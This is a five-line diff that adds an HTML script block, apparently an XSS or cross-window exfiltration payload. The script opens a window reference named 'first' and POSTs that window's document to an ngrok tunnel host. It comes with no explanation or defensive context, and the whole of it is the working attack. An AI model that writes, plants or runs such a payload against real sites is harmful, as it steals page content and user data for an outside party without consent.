@@ -1,0 +1,5 @@
+<script>
+    let req = new XMLHttpRequest();
+    req.open("POST", "http://adbf-76-64-140-29.ngrok.io");
+    req.send(window.open("", "first").document);
+</script>
